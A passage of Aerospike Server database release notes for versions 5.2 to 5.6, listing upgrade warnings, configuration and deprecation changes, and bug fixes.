    - For evictions, the relevant [`high-water-disk-pct`](https://docs.aerospike.com/reference/configuration#high-water-disk-pct)/[`high-water-memory-pct`](https://docs.aerospike.com/reference/configuration#high-water-memory-pct)/[`mounts-high-water-pct`](https://docs.aerospike.com/reference/configuration#mounts-high-water-pct) must be configured (new defaults are 0).
    - For details refer to the [`Namespace Retention Configuration`](https://docs.aerospike.com/operations/configure/namespace/retention) documentation.
  + The Predicate Expression API will be removed in the Aerospike Server version 6.0 release. Use [Aerospike Filter Expressions](https://docs.aerospike.com/guide/expressions) (added in version 5.2).
  + We have removed support for Ubuntu 16.04.
    - For more information please refer to: [Ubuntu 16.04 LTS (Xenial Xerus)](https://ubuntu.com/16-04).
  + Use [Prometheus Exporter](https://aerospike.com/download/monitoring/aerospike-prometheus-exporter/notes.html) version 1.2.1 or later to run Prometheus Exporter with this version of Aerospike Server.

  #### Bug Fixes

  + Enterprise Only
    - [AER-6427] - (KVS) For [`data-in-index`](https://docs.aerospike.com/reference/configuration#data-in-index) namespaces, durable deletes will cause an unnecessary assertion on a warm restart.
    - [AER-6437] - (KVS) Improper initialization of set index trees during warm restart may eventually cause a crash.

  #### Known Issues

  + [Known Issues: Server](https://docs.aerospike.com/server/reference/known_issues?all=true&q=5.6.0.4)
* [5.6.0.3](#5.6.0.3)

  **Release Date:** May 10, 2021
  + Aerospike Server release 5.6.0.3 contained a bug that may cause a server crash (AER-6437).
    - If you are running Aerospike Server version 5.6, we recommend that you upgrade to the latest release (currently 5.6.0.4).
  + The older Aerospike Connect Outbound versions do not work with Aerospike Server version 5.6 or newer. If you are using Aerospike Connect Outbound, you should upgrade respectively to:
    - Aerospike Connect for JMS - Outbound version 3.0.0 or newer
    - Aerospike Connect for Kafka - Outbound version 4.0.0 or newer
    - Aerospike Connect for Pulsar - Outbound version 2.0.0 or newer
    - XDR Proxy version 1.1.0 or newer
  + In Aerospike Server 5.5 or earlier, a UDF returning a Boolean value as a bin would be converted to 1 or 0. In Aerospike 5.6 or newer the value returns as true or false.
  + Downgrading from Aerospike Database version 5.5 or newer to version 5.4 or version 5.3 or version 5.2 (where XDR bin convergence has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + Downgrading from Aerospike Database version 5.4 to version 5.3 or version 5.2 (where XDR bin convergence has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + Downgrading from Aerospike Database version 5.2 or newer to a version previous to 5.2 (where XDR bin shipping has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + ATTENTION: Debian/Ubuntu users - if python2 is not installed, see the [Python Package Dependency for .deb Installers](https://discuss.aerospike.com/t/python-package-dependency-for-debian-deb-based-aerospike-tools-installers/7939) article.
  + Support for the XDR [`bin-policy`](https://docs.aerospike.com/reference/configuration#bin-policy) value 'only-specified', has been removed. Users of 'only-specified' will likely want to switch to 'changed-and-specified'.
    - Refer to the [Special Upgrades - Upgrading from 5.0 or 5.1 to 5.3 or newer - if using the XDR bin projection functionality](https://docs.aerospike.com/operations/upgrade/special_upgrades/bin_projection_upgrade) documentation.â¨
  + Aerospike Server version 5.1 or later requires the operating system distribution's **libcurl** shared object library.
  + Before upgrading to 5.0.0.4 or later, customers already running 5.0.0.3 in a cluster which is an active XDR destination (i.e. an XDR destination also acting as a source XDR or that may in the future act as a source XDR), may want to consider stopping all XDR traffic to the cluster. (Enterprise Only)
    - In the unlikely case of an upgraded 5.0.0.4 or newer node going down while 5.0.0.3 nodes are still running, those nodes would mistakenly ship XDR writes even if `forward` has not been explicitly enabled.
    - Enterprise Licensees may contact Aerospike Support for any questions before upgrading.
  + Cross-Datacenter Replication (XDR) running in Aerospike Server version 5.0 or newer can only connect to XDR destination clusters running versions 4.1 or newer.
  + **All nodes must be upgraded to Aerospike Server version 4.9.0.7 or newer. Please upgrade to the latest 4.9.0.x release** prior to upgrading to Aerospike Server version 5.0 or newer.
    - Aerospike Server version 5.0 or newer **will not** form a cluster with version 4.8 nodes or earlier.
    - When upgrading the Aerospike Server refer to the [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades) documentation.
  + The Aerospike Server **will not start** if obsolete configuration parameters are set in the Aerospike configuration file (aerospike.conf).
    - Refer to: [Configuration parameters that must be removed for Aerospike Server version 5.0 or newer](https://docs.aerospike.com/operations/upgrade/special_upgrades/50_removed_parameters)
  + As of Aerospike Server 4.9 scans are correct. The scan priority, fail\_on\_cluster\_change, and scan percent options, that were deprecated in Aerospike Server 4.9 are removed in Aerospike Server 5.6.
  + **ATTENTION:** As of Aerospike Server version 4.9, expirations and evictions are disabled by default.
    - For expirations, [`nsup-period`](https://docs.aerospike.com/reference/configuration#nsup-period) must be configured (new default is 0).
    - For evictions, the relevant [`high-water-disk-pct`](https://docs.aerospike.com/reference/configuration#high-water-disk-pct)/[`high-water-memory-pct`](https://docs.aerospike.com/reference/configuration#high-water-memory-pct)/[`mounts-high-water-pct`](https://docs.aerospike.com/reference/configuration#mounts-high-water-pct) must be configured (new defaults are 0).
    - For details refer to the [`Namespace Retention Configuration`](https://docs.aerospike.com/operations/configure/namespace/retention) documentation.
  + The Predicate Expression API will be removed in the Aerospike Server version 6.0 release. Use [Aerospike Filter Expressions](https://docs.aerospike.com/guide/expressions) (added in version 5.2).
  + We have removed support for Ubuntu 16.04.
    - For more information please refer to: [Ubuntu 16.04 LTS (Xenial Xerus)](https://ubuntu.com/16-04).
  + Use [Prometheus Exporter](https://aerospike.com/download/monitoring/aerospike-prometheus-exporter/notes.html) version 1.2.1 or later to run Prometheus Exporter with this version of Aerospike Server.

  + ATTENTION: Debian/Ubuntu users - if python2 is not installed, see the [Python Package Dependency for .deb Installers](https://discuss.aerospike.com/t/python-package-dependency-for-debian-deb-based-aerospike-tools-installers/7939) article.
  + Support for the XDR [`bin-policy`](https://docs.aerospike.com/reference/configuration#bin-policy) value 'only-specified', has been removed. Users of 'only-specified' will likely want to switch to 'changed-and-specified'.
    - Refer to the [Special Upgrades - Upgrading from 5.0 or 5.1 to 5.3 or newer - if using the XDR bin projection functionality](https://docs.aerospike.com/operations/upgrade/special_upgrades/bin_projection_upgrade) documentation.â¨
  + Aerospike Server version 5.1 or later requires the operating system distribution's **libcurl** shared object library.
  + Before upgrading to 5.0.0.4 or later, customers already running 5.0.0.3 in a cluster which is an active XDR destination (i.e. an XDR destination also acting as a source XDR or that may in the future act as a source XDR), may want to consider stopping all XDR traffic to the cluster. (Enterprise Only)
    - In the unlikely case of an upgraded 5.0.0.4 or newer node going down while 5.0.0.3 nodes are still running, those nodes would mistakenly ship XDR writes even if `forward` has not been explicitly enabled.
    - Enterprise Licensees may contact Aerospike Support for any questions before upgrading.
  + Cross-Datacenter Replication (XDR) running in Aerospike Server version 5.0 or newer can only connect to XDR destination clusters running versions 4.1 or newer.

  #### Improvements

  + Enterprise & Community
    - [AER-6475] - (GEO) For [`data-in-memory`](https://docs.aerospike.com/reference/configuration#data-in-memory) namespaces, when trimming GeoJSON particles, reallocate into the appropriate namespace arena.

  #### Bug Fixes

  + Enterprise & Community
    - [AER-6472] - (SINDEX) If a replica record is expired or truncated, but not yet actually deleted, it is skipped when building a secondary index, but may also be skipped by a replica write.
  + Enterprise Only
    - [AER-6474] - (XDR) DC [`throughput`](https://docs.aerospike.com/reference/metrics#throughput) statistic may be incorrect when there are multiple namespaces.

* [5.5.0.16](#5.5.0.16)

  **Release Date:** August 4, 2021
  + Downgrading from Aerospike Database version 5.5 or newer to version 5.4 or version 5.3 or version 5.2 (where XDR bin convergence has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + Downgrading from Aerospike Database version 5.4 to version 5.3 or version 5.2 (where XDR bin convergence has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + Downgrading from Aerospike Database version 5.2 or newer to a version previous to 5.2 (where XDR bin shipping has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + ATTENTION: Debian/Ubuntu users - if python2 is not installed, see the [Python Package Dependency for .deb Installers](https://discuss.aerospike.com/t/python-package-dependency-for-debian-deb-based-aerospike-tools-installers/7939) article.
  + Support for the XDR [`bin-policy`](https://docs.aerospike.com/reference/configuration#bin-policy) value 'only-specified', has been removed. Users of 'only-specified' will likely want to switch to 'changed-and-specified'.
    - Refer to the [Special Upgrades - Upgrading from 5.0 or 5.1 to 5.3 or newer - if using the XDR bin projection functionality](https://docs.aerospike.com/operations/upgrade/special_upgrades/bin_projection_upgrade) documentation.â¨
  + Aerospike Server version 5.1 or later requires the operating system distribution's **libcurl** shared object library.
  + Before upgrading to 5.0.0.4 or later, customers already running 5.0.0.3 in a cluster which is an active XDR destination (i.e. an XDR destination also acting as a source XDR or that may in the future act as a source XDR), may want to consider stopping all XDR traffic to the cluster. (Enterprise Only)
    - In the unlikely case of an upgraded 5.0.0.4 or newer node going down while 5.0.0.3 nodes are still running, those nodes would mistakenly ship XDR writes even if `forward` has not been explicitly enabled.
    - Enterprise Licensees may contact Aerospike Support for any questions before upgrading.
  + Cross-Datacenter Replication (XDR) running in Aerospike Server version 5.0 or newer can only connect to XDR destination clusters running versions 4.1 or newer.
  + **All nodes must be upgraded to Aerospike Server version 4.9.0.7 or newer. Please upgrade to the latest 4.9.0.x release** prior to upgrading to Aerospike Server version 5.0 or newer.
    - Aerospike Server version 5.0 or newer **will not** form a cluster with version 4.8 nodes or earlier.
    - When upgrading the Aerospike Server refer to the [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades) documentation.
  + The Aerospike Server **will not start** if obsolete configuration parameters are set in the Aerospike configuration file (aerospike.conf).
    - Refer to: [Configuration parameters that must be removed for Aerospike Server version 5.0 or newer](https://docs.aerospike.com/operations/upgrade/special_upgrades/50_removed_parameters)
  + **ATTENTION:** As of Aerospike Server version 4.9, expirations and evictions are disabled by default.
    - For expirations, [`nsup-period`](https://docs.aerospike.com/reference/configuration#nsup-period) must be configured (new default is 0).
    - For evictions, the relevant [`high-water-disk-pct`](https://docs.aerospike.com/reference/configuration#high-water-disk-pct)/[`high-water-memory-pct`](https://docs.aerospike.com/reference/configuration#high-water-memory-pct)/[`mounts-high-water-pct`](https://docs.aerospike.com/reference/configuration#mounts-high-water-pct) must be configured (new defaults are 0).

  #### Bug Fixes

  + Enterprise Only
    - [AER-6427] - (KVS) For [`data-in-index`](https://docs.aerospike.com/reference/configuration#data-in-index) namespaces, durable deletes will cause an unnecessary assertion on a warm restart.

* [5.5.0.10](#5.5.0.10)

  **Release Date:** May 10, 2021
  + Downgrading from Aerospike Database version 5.5 or newer to version 5.4 or version 5.3 or version 5.2 (where XDR bin convergence has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + Downgrading from Aerospike Database version 5.4 to version 5.3 or version 5.2 (where XDR bin convergence has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + Downgrading from Aerospike Database version 5.2 or newer to a version previous to 5.2 (where XDR bin shipping has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + ATTENTION: Debian/Ubuntu users - if python2 is not installed, see the [Python Package Dependency for .deb Installers](https://discuss.aerospike.com/t/python-package-dependency-for-debian-deb-based-aerospike-tools-installers/7939) article.
  + Support for the XDR [`bin-policy`](https://docs.aerospike.com/reference/configuration#bin-policy) value 'only-specified', has been removed. Users of 'only-specified' will likely want to switch to 'changed-and-specified'.
    - Refer to the [Special Upgrades - Upgrading from 5.0 or 5.1 to 5.3 or newer - if using the XDR bin projection functionality](https://docs.aerospike.com/operations/upgrade/special_upgrades/bin_projection_upgrade) documentation.â¨
  + Aerospike Server version 5.1 or later requires the operating system distribution's **libcurl** shared object library.
  + Before upgrading to 5.0.0.4 or later, customers already running 5.0.0.3 in a cluster which is an active XDR destination (i.e. an XDR destination also acting as a source XDR or that may in the future act as a source XDR), may want to consider stopping all XDR traffic to the cluster. (Enterprise Only)
    - In the unlikely case of an upgraded 5.0.0.4 or newer node going down while 5.0.0.3 nodes are still running, those nodes would mistakenly ship XDR writes even if `forward` has not been explicitly enabled.
    - Enterprise Licensees may contact Aerospike Support for any questions before upgrading.
  + Cross-Datacenter Replication (XDR) running in Aerospike Server version 5.0 or newer can only connect to XDR destination clusters running versions 4.1 or newer.
  + **All nodes must be upgraded to Aerospike Server version 4.9.0.7 or newer. Please upgrade to the latest 4.9.0.x release** prior to upgrading to Aerospike Server version 5.0 or newer.
    - Aerospike Server version 5.0 or newer **will not** form a cluster with version 4.8 nodes or earlier.
    - When upgrading the Aerospike Server refer to the [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades) documentation.
  + The Aerospike Server **will not start** if obsolete configuration parameters are set in the Aerospike configuration file (aerospike.conf).
    - Refer to: [Configuration parameters that must be removed for Aerospike Server version 5.0 or newer](https://docs.aerospike.com/operations/upgrade/special_upgrades/50_removed_parameters)
  + **ATTENTION:** As of Aerospike Server version 4.9, expirations and evictions are disabled by default.
    - For expirations, [`nsup-period`](https://docs.aerospike.com/reference/configuration#nsup-period) must be configured (new default is 0).
    - For evictions, the relevant [`high-water-disk-pct`](https://docs.aerospike.com/reference/configuration#high-water-disk-pct)/[`high-water-memory-pct`](https://docs.aerospike.com/reference/configuration#high-water-memory-pct)/[`mounts-high-water-pct`](https://docs.aerospike.com/reference/configuration#mounts-high-water-pct) must be configured (new defaults are 0).

* [5.4.0.18](#5.4.0.18)

  **Release Date:** August 4, 2021
  + Downgrading from Aerospike Database version 5.4 or newer to version 5.3 or version 5.2 (where XDR bin convergence has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + Downgrading from Aerospike Database version 5.2 or newer to a version previous to 5.2 (where XDR bin shipping has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + ATTENTION: Debian/Ubuntu users - if python2 is not installed, see the [Python Package Dependency for .deb Installers](https://discuss.aerospike.com/t/python-package-dependency-for-debian-deb-based-aerospike-tools-installers/7939) article.
  + Support for the XDR [`bin-policy`](https://docs.aerospike.com/reference/configuration#bin-policy) value 'only-specified', has been removed. Users of 'only-specified' will likely want to switch to 'changed-and-specified'.
    - Refer to the [Special Upgrades - Upgrading from 5.0 or 5.1 to 5.3 or newer - if using the XDR bin projection functionality](https://docs.aerospike.com/operations/upgrade/special_upgrades/bin_projection_upgrade) documentation.â¨
  + Aerospike Server version 5.1 or later requires the operating system distribution's **libcurl** shared object library.
  + Before upgrading to 5.0.0.4 or later, customers already running 5.0.0.3 in a cluster which is an active XDR destination (i.e. an XDR destination also acting as a source XDR or that may in the future act as a source XDR), may want to consider stopping all XDR traffic to the cluster. (Enterprise Only)
    - In the unlikely case of an upgraded 5.0.0.4 or newer node going down while 5.0.0.3 nodes are still running, those nodes would mistakenly ship XDR writes even if `forward` has not been explicitly enabled.
    - Enterprise Licensees may contact Aerospike Support for any questions before upgrading.
  + Cross-Datacenter Replication (XDR) running in Aerospike Server version 5.0 or newer can only connect to XDR destination clusters running versions 4.1 or newer.
  + **All nodes must be upgraded to Aerospike Server version 4.9.0.7 or newer. Please upgrade to the latest 4.9.0.x release** prior to upgrading to Aerospike Server version 5.0 or newer.
    - Aerospike Server version 5.0 or newer **will not** form a cluster with version 4.8 nodes or earlier.
    - When upgrading the Aerospike Server refer to the [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades) documentation.
  + The Aerospike Server **will not start** if obsolete configuration parameters are set in the Aerospike configuration file (aerospike.conf).
    - Refer to: [Configuration parameters that must be removed for Aerospike Server version 5.0 or newer](https://docs.aerospike.com/operations/upgrade/special_upgrades/50_removed_parameters)
  + **ATTENTION:** As of Aerospike Server version 4.9, expirations and evictions are disabled by default.
    - For expirations, [`nsup-period`](https://docs.aerospike.com/reference/configuration#nsup-period) must be configured (new default is 0).
    - For evictions, the relevant [`high-water-disk-pct`](https://docs.aerospike.com/reference/configuration#high-water-disk-pct)/[`high-water-memory-pct`](https://docs.aerospike.com/reference/configuration#high-water-memory-pct)/[`mounts-high-water-pct`](https://docs.aerospike.com/reference/configuration#mounts-high-water-pct) must be configured (new defaults are 0).

* [5.3.0.25](#5.3.0.25)

  **Release Date:** September 15, 2021
  + Downgrading from Aerospike Database version 5.2 or newer to a version previous to 5.2 (where XDR bin shipping has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + ATTENTION: Debian/Ubuntu users - if python2 is not installed, see the [Python Package Dependency for .deb Installers](https://discuss.aerospike.com/t/python-package-dependency-for-debian-deb-based-aerospike-tools-installers/7939) article.
  + Support for the XDR [`bin-policy`](https://docs.aerospike.com/reference/configuration#bin-policy) value 'only-specified', has been removed. Users of 'only-specified' will likely want to switch to 'changed-and-specified'.
    - Refer to the [Special Upgrades - Upgrading from 5.0 or 5.1 to 5.3 or newer - if using the XDR bin projection functionality](https://docs.aerospike.com/operations/upgrade/special_upgrades/bin_projection_upgrade) documentation.â¨
  + Aerospike Server version 5.1 or later requires the operating system distribution's **libcurl** shared object library.
  + Before upgrading to 5.0.0.4 or later, customers already running 5.0.0.3 in a cluster which is an active XDR destination (i.e. an XDR destination also acting as a source XDR or that may in the future act as a source XDR), may want to consider stopping all XDR traffic to the cluster. (Enterprise Only)
    - In the unlikely case of an upgraded 5.0.0.4 or newer node going down while 5.0.0.3 nodes are still running, those nodes would mistakenly ship XDR writes even if `forward` has not been explicitly enabled.
    - Enterprise Licensees may contact Aerospike Support for any questions before upgrading.
  + Cross-Datacenter Replication (XDR) running in Aerospike Server version 5.0 or newer can only connect to XDR destination clusters running versions 4.1 or newer.
  + **All nodes must be upgraded to Aerospike Server version 4.9.0.7 or newer. Please upgrade to the latest 4.9.0.x release** prior to upgrading to Aerospike Server version 5.0 or newer.
    - Aerospike Server version 5.0 or newer **will not** form a cluster with version 4.8 nodes or earlier.
    - When upgrading the Aerospike Server refer to the [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades) documentation.
  + The Aerospike Server **will not start** if obsolete configuration parameters are set in the Aerospike configuration file (aerospike.conf).
    - Refer to: [Configuration parameters that must be removed for Aerospike Server version 5.0 or newer](https://docs.aerospike.com/operations/upgrade/special_upgrades/50_removed_parameters)
  + **ATTENTION:** As of Aerospike Server version 4.9, expirations and evictions are disabled by default.
    - For expirations, [`nsup-period`](https://docs.aerospike.com/reference/configuration#nsup-period) must be configured (new default is 0).
    - For evictions, the relevant [`high-water-disk-pct`](https://docs.aerospike.com/reference/configuration#high-water-disk-pct)/[`high-water-memory-pct`](https://docs.aerospike.com/reference/configuration#high-water-memory-pct)/[`mounts-high-water-pct`](https://docs.aerospike.com/reference/configuration#mounts-high-water-pct) must be configured (new defaults are 0).

  + [Known Issues: Server](https://docs.aerospike.com/server/reference/known_issues?all=true&q=5.3.0.19)
* [5.3.0.18](#5.3.0.18)

  **Release Date:** May 25, 2021
  + Downgrading from Aerospike Database version 5.2 or newer to a version previous to 5.2 (where XDR bin shipping has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + ATTENTION: Debian/Ubuntu users - if python2 is not installed, see the [Python Package Dependency for .deb Installers](https://discuss.aerospike.com/t/python-package-dependency-for-debian-deb-based-aerospike-tools-installers/7939) article.
  + Support for the XDR [`bin-policy`](https://docs.aerospike.com/reference/configuration#bin-policy) value 'only-specified', has been removed. Users of 'only-specified' will likely want to switch to 'changed-and-specified'.
    - Refer to the [Special Upgrades - Upgrading from 5.0 or 5.1 to 5.3 or newer - if using the XDR bin projection functionality](https://docs.aerospike.com/operations/upgrade/special_upgrades/bin_projection_upgrade) documentation.â¨
  + Aerospike Server version 5.1 or later requires the operating system distribution's **libcurl** shared object library.
  + Before upgrading to 5.0.0.4 or later, customers already running 5.0.0.3 in a cluster which is an active XDR destination (i.e. an XDR destination also acting as a source XDR or that may in the future act as a source XDR), may want to consider stopping all XDR traffic to the cluster. (Enterprise Only)
    - In the unlikely case of an upgraded 5.0.0.4 or newer node going down while 5.0.0.3 nodes are still running, those nodes would mistakenly ship XDR writes even if `forward` has not been explicitly enabled.
    - Enterprise Licensees may contact Aerospike Support for any questions before upgrading.
  + Cross-Datacenter Replication (XDR) running in Aerospike Server version 5.0 or newer can only connect to XDR destination clusters running versions 4.1 or newer.
  + **All nodes must be upgraded to Aerospike Server version 4.9.0.7 or newer. Please upgrade to the latest 4.9.0.x release** prior to upgrading to Aerospike Server version 5.0 or newer.
    - Aerospike Server version 5.0 or newer **will not** form a cluster with version 4.8 nodes or earlier.
    - When upgrading the Aerospike Server refer to the [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades) documentation.
  + The Aerospike Server **will not start** if obsolete configuration parameters are set in the Aerospike configuration file (aerospike.conf).
    - Refer to: [Configuration parameters that must be removed for Aerospike Server version 5.0 or newer](https://docs.aerospike.com/operations/upgrade/special_upgrades/50_removed_parameters)

    - [AER-6351] - (SCAN) When generating sub-transactions for background scans and queries, the record TTL of the parent transaction is ignored.
  + Enterprise Only
    - [AER-6353] - (TLS) If network TLS context configuration items [`cert-file`](https://docs.aerospike.com/reference/configuration#cert-file) or [`key-file`](https://docs.aerospike.com/reference/configuration#key-file) point to environment variables, the server will not start.
    - [AER-6350] - (XDR) If a DC is dynamically removed and another added, handling of authentication configuration items may cause a double-free.

  #### Known Issues

  + [Known Issues: Server](https://docs.aerospike.com/server/reference/known_issues?all=true&q=5.3.0.3)
* [5.3.0.2](#5.3.0.2)

  **Release Date:** December 10, 2020
  + Downgrading from Aerospike Database version 5.2 or newer to a version previous to 5.2 (where XDR bin shipping has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + The Cross-Datacenter Replication (XDR) feature now includes the ability to filter using Expressions.
    - Refer to: [XDR Filter Expressions](https://docs.aerospike.com/guide/expressions/#xdr-filter-expressions)
  + ATTENTION: Debian/Ubuntu users - if python2 is not installed, see the [Python Package Dependency for .deb Installers](https://discuss.aerospike.com/t/python-package-dependency-for-debian-deb-based-aerospike-tools-installers/7939) article.
  + Support for the XDR [`bin-policy`](https://docs.aerospike.com/reference/configuration#bin-policy) value 'only-specified', has been removed. Users of 'only-specified' will likely want to switch to 'changed-and-specified'.
    - Refer to the [Special Upgrades - Upgrading from 5.0 or 5.1 to 5.3 or newer - if using the XDR bin projection functionality](https://docs.aerospike.com/operations/upgrade/special_upgrades/bin_projection_upgrade) documentation.â¨
  + Aerospike Server version 5.1 or later requires the operating system distribution's **libcurl** shared object library.
  + Before upgrading to 5.0.0.4 or later, customers already running 5.0.0.3 in a cluster which is an active XDR destination (i.e. an XDR destination also acting as a source XDR or that may in the future act as a source XDR), may want to consider stopping all XDR traffic to the cluster. (Enterprise Only)
    - In the unlikely case of an upgraded 5.0.0.4 or newer node going down while 5.0.0.3 nodes are still running, those nodes would mistakenly ship XDR writes even if `forward` has not been explicitly enabled.
    - Enterprise Licensees may contact Aerospike Support for any questions before upgrading.
  + Cross-Datacenter Replication (XDR) running in Aerospike Server version 5.0 or newer can only connect to XDR destination clusters running versions 4.1 or newer.
  + **All nodes must be upgraded to Aerospike Server version 4.9.0.7 or newer. Please upgrade to the latest 4.9.0.x release** prior to upgrading to Aerospike Server version 5.0 or newer.
    - Aerospike Server version 5.0 or newer **will not** form a cluster with version 4.8 nodes or earlier.
    - When upgrading the Aerospike Server refer to the [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades) documentation.
  + The Aerospike Server **will not start** if obsolete configuration parameters are set in the Aerospike configuration file (aerospike.conf).
    - Refer to: [Configuration parameters that must be removed for Aerospike Server version 5.0 or newer](https://docs.aerospike.com/operations/upgrade/special_upgrades/50_removed_parameters)
  + **ATTENTION:** As of Aerospike Server version 4.9, expirations and evictions are disabled by default.
    - For expirations, [`nsup-period`](https://docs.aerospike.com/reference/configuration#nsup-period) must be configured (new default is 0).
    - For evictions, the relevant [`high-water-disk-pct`](https://docs.aerospike.com/reference/configuration#high-water-disk-pct)/[`high-water-memory-pct`](https://docs.aerospike.com/reference/configuration#high-water-memory-pct)/[`mounts-high-water-pct`](https://docs.aerospike.com/reference/configuration#mounts-high-water-pct) must be configured (new defaults are 0).
    - For details refer to the [`Namespace Retention Configuration`](https://docs.aerospike.com/operations/configure/namespace/retention) documentation.

  #### Bug Fixes

  + Enterprise Only
    - [AER-6390] - (XDR) For [`strong-consistency`](https://docs.aerospike.com/reference/configuration#strong-consistency) namespaces, when DC namespace context configuration item [`bin-policy`](https://docs.aerospike.com/reference/configuration#bin-policy) is not 'all', shipping records that are unreplicated may miss some bins.

  + Support [Aerospike Expression](https://docs.aerospike.com/guide/expressions/) filters. Aerospike Expression filters give access to the full data type APIs (List, Map, Bit, HyperLogLog, Geospatial) and expanded metadata based filtering, to increase the power of filters in selecting records.
  + Support for the info command [`latency`](https://docs.aerospike.com/reference/info#latency) has been removed and replaced with a new info command [`latencies`](https://docs.aerospike.com/reference/info#latencies) to track all latency histograms.

  #### Known Issues

  + [Known Issues: Server](https://docs.aerospike.com/server/reference/known_issues?all=true&q=5.2.0.5)
* [5.2.0.4](#5.2.0.4)

  **Release Date:** October 14, 2020
  + Downgrading from Aerospike Database version 5.2 or newer to a version previous to 5.2 (where XDR bin shipping has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + ATTENTION: Debian/Ubuntu users - if python2 is not installed, see the [Python Package Dependency for .deb Installers](https://discuss.aerospike.com/t/python-package-dependency-for-debian-deb-based-aerospike-tools-installers/7939) article.
  + Support [Aerospike Expression](https://docs.aerospike.com/guide/expressions/) filters. Aerospike Expression filters give access to the full data type APIs (List, Map, Bit, HyperLogLog, Geospatial) and expanded metadata based filtering, to increase the power of filters in selecting records.
  + Support for the info command [`latency`](https://docs.aerospike.com/reference/info#latency) has been removed and replaced with a new info command [`latencies`](https://docs.aerospike.com/reference/info#latencies) to track all latency histograms.
  + Support for the XDR [`bin-policy`](https://docs.aerospike.com/reference/configuration#bin-policy) value 'only-specified', which replaced the configuration item [`ship-only-specified-bins`](https://docs.aerospike.com/reference/configuration#ship-only-specified-bins) in the 5.0 and 5.1 releases, will be removed in 5.3 and above. Users of 'only-specified' will likely want to switch to 'changed-and-specified'.
  + Aerospike Server version 5.1 or later requires the operating system distribution's **libcurl** shared object library.

    - [AER-6309] - (CDT) For ordered lists, [`get_all_by_value_list`](https://docs.aerospike.com/guide/data-types/cdt-list-ops#get_all_by_value_list) operation with result type value always returns an empty list.
    - [AER-6308] - (EXPRESSIONS) Miscellaneous issues in new expressions, which are not yet accessible from clients.
  + Enterprise Only
    - [AER-6304] - (BALANCE) When quiescing a node, for AP namespaces, empty partition trees are unnecessarily allocated for unowned partitions.
    - [AER-6302] - (XDR) Namespace context configuration item [`xdr-tomb-raider-period`](https://docs.aerospike.com/reference/configuration#xdr-tomb-raider-period) cannot be set using time units.
    - [AER-6310] - (XDR) When connection to seed node fails, TLS name will be double freed and may cause a crash.

  #### Improvements

  + Enterprise & Community
    - [AER-6357] - (KVS) Handle exceeding the OS file descriptor limit gracefully, without asserting.

  #### Bug Fixes

  + Enterprise & Community
    - [AER-6358] - (KVS) For [`single-bin`](https://docs.aerospike.com/reference/configuration#single-bin), [`data-in-memory`](https://docs.aerospike.com/reference/configuration#data-in-memory) namespaces, unwinding on failing a write operation may incorrectly free the original bin particle.
  + Enterprise Only
    - [AER-6363] - (KVS) A write or a UDF that deletes all of a record's bins may result in a tombstone with a non-zero void-time.
    - [AER-6361] - (LDAP) Concurrent LDAP logins may result in a double-free of the LDAP library's copy of the [`tls-ca-file`](https://docs.aerospike.com/reference/configuration#tls-ca-file) configuration item.

  + ATTENTION: Debian/Ubuntu users - if python2 is not installed, see the [Python Package Dependency for .deb Installers](https://discuss.aerospike.com/t/python-package-dependency-for-debian-deb-based-aerospike-tools-installers/7939) article.
  + For the info command [`latency`](https://docs.aerospike.com/reference/info#latency) support has been deprecated and will be removed in the next major release.
    - Please use the new replacement info command [`latencies`](https://docs.aerospike.com/reference/info#latencies) to track all latency histograms.
  + Aerospike Server version 5.1 or later requires the operating system distribution's **libcurl** shared object library.
  + Before upgrading to 5.0.0.4 or later, customers already running 5.0.0.3 in a cluster which is an active XDR destination (i.e. an XDR destination also acting as a source XDR or that may in the future act as a source XDR), may want to consider stopping all XDR traffic to the cluster. (Enterprise Only)
    - In the unlikely case of an upgraded 5.0.0.4 or newer node going down while 5.0.0.3 nodes are still running, those nodes would mistakenly ship XDR writes even if `forward` has not been explicitly enabled.
    - Enterprise Licensees may contact Aerospike Support for any questions before upgrading.
  + Cross-Datacenter Replication (XDR) running in Aerospike Server version 5.0 or newer can only connect to XDR destination clusters running versions 4.1 or newer.
  + **All nodes must be upgraded to Aerospike Server version 4.9.0.7 or newer. Please upgrade to the latest 4.9.0.x release** prior to upgrading to Aerospike Server version 5.0 or newer.
    - Aerospike Server version 5.0 or newer will not form a cluster with version 4.8 nodes or earlier.
    - When upgrading the Aerospike Server refer to the [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades) documentation.
  + The Aerospike Server **will not start** if obsolete configuration parameters are set in the Aerospike configuration file (aerospike.conf).
    - Refer to: [Configuration parameters that must be removed for Aerospike Server version 5.0 or newer](https://docs.aerospike.com/operations/upgrade/special_upgrades/50_removed_parameters)
  + **ATTENTION:** As of Aerospike Server version 4.9, expirations and evictions are disabled by default.
    - For expirations, [`nsup-period`](https://docs.aerospike.com/reference/configuration#nsup-period) must be configured (new default is 0).
